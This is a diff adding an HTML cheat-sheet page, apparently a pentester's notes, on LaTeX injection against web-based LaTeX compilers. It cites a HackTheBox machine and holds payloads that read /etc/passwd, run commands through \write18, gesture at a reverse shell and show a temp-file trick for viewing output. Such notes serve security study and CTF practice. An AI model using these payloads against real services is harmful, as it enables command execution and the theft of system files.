@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Web-based LaTeX Compilers</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Web-based LaTeX Compilers</h1></strong><br />LaTeX is used to for writing/making/generating PDFs. <br />Web-based LaTeX compilers are vulnerable to command injection because they take user input.<br /><br /><strong>Links</strong><br />• <a href="https://0day.work/hacking-with-latex/">https://0day.work/hacking-with-latex/</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection</a><br /><br /><strong>Examples</strong><br />• hackthebox Chaos<br /><br /><strong><h2>## Read file</h2></strong><br /><code>\input{/etc/passwd}</code><br /><br /><strong><h2>## Command Execution</h2></strong><br /><code>\immediate\write18{cat /etc/passwd}</code><br /><code>\immediate\write18{&lt;reverse shell&gt;}</code><br /><br /><strong><h3>### Viewing Command Output</h3></strong><br />The input of the command will be redirected to stdin, so use a temp file to get it.<br /><code>\immediate\write18{cat /etc/passwd &gt; /tmp/passwd}<br />\input{/tmp/passwd}</code><br /><br />Or you can see the result of the command in the response from the web server.<br /><a href=""><img src="images/183-1.png" alt="images/183-1.png" /></a><br /></div>
+</body>
+</html>
